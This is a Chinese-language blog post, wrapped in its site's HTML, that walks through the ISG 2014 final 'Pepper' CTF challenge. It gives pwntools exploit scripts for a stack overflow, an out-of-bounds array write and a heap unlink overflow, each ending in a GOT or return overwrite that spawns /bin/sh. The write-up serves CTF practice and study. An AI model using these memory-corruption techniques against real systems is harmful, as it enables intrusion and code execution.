@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>[Review]ISG 2014 Final Pepper | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="ISG 2014 决赛上的一道题目，捡起来练练手。
+逆向分析逆向一直是我的弱点，经验不足，过度依赖 F5，总体感觉还是汇编能力太弱了 ：（我的 idb 文件在这里：点击下载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Review]ISG 2014 Final Pepper">
+<meta property="og:url" content="http://sh3ll.me/2016/05/15/review-pepper/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="ISG 2014 决赛上的一道题目，捡起来练练手。
+逆向分析逆向一直是我的弱点，经验不足，过度依赖 F5，总体感觉还是汇编能力太弱了 ：（我的 idb 文件在这里：点击下载">
+<meta property="og:image" content="http://sh3ll.me/images/2016/05/15/pepper-1.png">
+<meta property="og:image" content="http://sh3ll.me/images/2016/05/15/pepper-2.png">
+<meta property="og:image" content="http://sh3ll.me/images/2016/05/15/pepper-3.png">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[Review]ISG 2014 Final Pepper">
+<meta name="twitter:description" content="ISG 2014 决赛上的一道题目，捡起来练练手。
+逆向分析逆向一直是我的弱点，经验不足，过度依赖 F5，总体感觉还是汇编能力太弱了 ：（我的 idb 文件在这里：点击下载">
+<meta name="twitter:image" content="http://sh3ll.me/images/2016/05/15/pepper-1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-review-pepper" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      [Review]ISG 2014 Final Pepper
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2016-05-15T09:12:45.000Z" itemprop="datePublished">05-15-2016</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Exploit/">Exploit</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ISG 2014 决赛上的一道题目，捡起来练练手。</p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>逆向一直是我的弱点，经验不足，过度依赖 F5，总体感觉还是汇编能力太弱了 ：（<br>我的 idb 文件在这里：<a href="/images/2016/05/15/pepper.idb">点击下载</a><a id="more"></a></p>
+<h2 id="31337（0x08048F67）-栈溢出"><a href="#31337（0x08048F67）-栈溢出" class="headerlink" title="31337（0x08048F67） 栈溢出"></a>31337（0x08048F67） 栈溢出</h2><p>Menu 中存在一隐藏选项，0x08048F67，实质是一个栈溢出的后门：<br><img src="/images/2016/05/15/pepper-1.png" alt="图 1"><br>系统开启 ASLR，但编译时未开启 PIC 选项。首先需要泄露出 libc 地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.log_level = &quot;DEBUG&quot;</div><div class="line">conn = process(&quot;/home/vagrant/pepper&quot;)</div><div class="line"># conn = remote(&quot;127.0.0.1&quot;, 2333)</div><div class="line">elf = ELF(&quot;/home/vagrant/pepper&quot;)</div><div class="line">libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.19.so&quot;)</div><div class="line"></div><div class="line">def get_advice(advice):</div><div class="line">    conn.recvuntil(&quot;Your choice: &quot;)</div><div class="line">    conn.sendline(&quot;31337&quot;)</div><div class="line">    conn.recvuntil(&quot;Leave your message: &quot;)</div><div class="line">    conn.sendline(advice)</div><div class="line"></div><div class="line"># leak libc base</div><div class="line">puts_plt = elf.plt.get(&quot;puts&quot;)</div><div class="line">get_advice_addr = 0x08048F67</div><div class="line">atoi_got = elf.got.get(&quot;atoi&quot;)</div><div class="line">log.info(&quot;puts@plt: &#123;&#125;&quot;.format(hex(puts_plt)))</div><div class="line">log.info(&quot;get_advice_addr: &#123;&#125;&quot;.format(hex(get_advice_addr)))</div><div class="line">log.info(&quot;atoi@got: &#123;&#125;&quot;.format(hex(atoi_got)))</div><div class="line">get_advice(&quot;A&quot; * 112 + pack(puts_plt) + pack(get_advice_addr) + pack(atoi_got))</div><div class="line">conn.recvuntil(&quot;We got that. Thanks.\n&quot;)</div><div class="line">libc_base = unpack(conn.recv(4)) - libc.symbols.get(&quot;atoi&quot;)</div><div class="line">libc.address += libc_base</div><div class="line"># libc_gets = libc.symbols.get(&quot;gets&quot;)</div><div class="line">libc_system = libc.symbols.get(&quot;system&quot;)</div><div class="line">log.success(&quot;libc base: &#123;&#125;&quot;.format(hex(libc_base)))</div><div class="line"># log.success(&quot;libc gets: &#123;&#125;&quot;.format(hex(libc_gets)))</div><div class="line">log.success(&quot;system@libc: &#123;&#125;&quot;.format(hex(libc_system)))</div></pre></td></tr></table></figure></p>
+<p>然后覆盖 ret 为 system 就可以了，这里利用了杨坤@Blue-Lotus 在《掘金 CTF》中提到的一个 TIP，直接在 libc.so 中查找 <code>/bin/sh</code> 字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># exploit</div><div class="line">conn.recvuntil(&quot;Leave your message: &quot;)</div><div class="line">conn.sendline(&quot;A&quot; * 112 + pack(libc_system) + &quot;AAAA&quot; + pack(libc_base + 0x00160A24))</div><div class="line">conn.recvline()</div><div class="line">conn.interactive()</div></pre></td></tr></table></figure></p>
+<p>糖果师傅说比赛中选手很有可能修改掉这些字符串，所以还是自己输入靠谱些；）</p>
+<h2 id="EditRestaurant（0x08048C63）-数组越界"><a href="#EditRestaurant（0x08048C63）-数组越界" class="headerlink" title="EditRestaurant（0x08048C63） 数组越界"></a>EditRestaurant（0x08048C63） 数组越界</h2><p>程序内多处存在数组越界的问题，在这个函数中可以通过伪造结构，利用数组越界做任意地址写：<br><img src="/images/2016/05/15/pepper-2.png" alt="图 2"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"># add a restaurant to fake</div><div class="line">padding = &quot;A&quot; * 0x24</div><div class="line">fake_restaurant = p32(0x1) + p32(0x1) + p32(pepper.got.get(&quot;atoi&quot;)) + &quot;A&quot; * 0x20 + p32(0x1) + p32(0x0804B0A0)</div><div class="line">add_restaurant(&quot;xxoo&quot;, padding + fake_restaurant, 1, &quot;xxoo&quot;, 1)</div><div class="line"></div><div class="line"># information leak</div><div class="line">show_details_of_restaurant(101)</div><div class="line">io.recvuntil(&quot;Recommended Dish: &quot;)</div><div class="line">libc.address = u32(io.recv(4)) - libc.symbols.get(&quot;atoi&quot;)</div><div class="line">log.success(&quot;libc base =&gt; &#123;&#125;&quot;.format(hex(libc.address)))</div><div class="line">log.success(&quot;system addr =&gt; &#123;&#125;&quot;.format(hex(libc.symbols.get(&quot;system&quot;))))</div><div class="line"></div><div class="line"># set atoi@got to system@symbols</div><div class="line">edit_restaurant(101, 1, pack(libc.symbols.get(&quot;system&quot;)))</div><div class="line"></div><div class="line"># getshell</div><div class="line">io.recvuntil(&quot;Your choice: &quot;)</div><div class="line">io.sendline(&quot;/bin/sh\x00&quot;)</div><div class="line">io.recvuntil(&quot;Your choice: &quot;)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<h2 id="EditRestaurant（0x08048C63）-堆溢出"><a href="#EditRestaurant（0x08048C63）-堆溢出" class="headerlink" title="EditRestaurant（0x08048C63） 堆溢出"></a>EditRestaurant（0x08048C63） 堆溢出</h2><p>同样是这个函数中，在修改 Description 未进行长度校验，导致堆溢出。<br><img src="/images/2016/05/15/pepper-3.png" alt="图 3"><br>利用方式是先申请 3 个 restaurant，通过修改 restaurant 0 的 Description 溢出 restaurant 1 和 restaurant 2 的 Description，伪造 chunk；删除 restaurant 2，程序去 free restaurant2’s description，进而 unlink 伪造的 chunk，double free；再次编辑 restaurant 1 可以修改 restaurant 的 Description Addr 至任意地址；再一次编辑时实现任意地址写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># Alloc 3</div><div class="line">for i in range(3):</div><div class="line">    add_restaurant(&quot;roadname&quot;, &quot;road&quot;, i+1, &quot;A&quot;*100, i)</div><div class="line"></div><div class="line"></div><div class="line"># overflow chunk 0</div><div class="line">payload = &quot;A&quot; * 0x70</div><div class="line">payload += p32(0) + p32(0x71) + p32(0x804b0d0) + p32(0x804b0d4) + &quot;A&quot; * (0x70 - 0x10 - 0x8)</div><div class="line">payload += p32(0x68) + p32(0x70)</div><div class="line">edit_restaurant(0, 1, payload)</div><div class="line"></div><div class="line"># double free</div><div class="line">delete_restaurant(2)</div><div class="line"></div><div class="line"></div><div class="line"># set chunk1&apos;s desc addr to atoi@got</div><div class="line">edit_restaurant(1, 1, &quot;A&quot; * 0xC + p32(0x804b048))</div><div class="line"></div><div class="line"></div><div class="line"># edit atoi@got to system</div><div class="line">edit_restaurant(1, 1, p32(0xf7e39b30))</div><div class="line"></div><div class="line"></div><div class="line"># spawn /bin/sh</div><div class="line">io.recvuntil(&quot;Your choice: &quot;)</div><div class="line">io.sendline(&quot;/bin/sh&quot;)</div><div class="line">io.recvuntil(&quot;Your choice: &quot;)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2016/05/15/review-pepper/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/06/28/baimao-vms/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          3 个白帽 - VMS
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/04/13/shit/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">最近的一些吐嘈</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2016/05/15/review-pepper/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
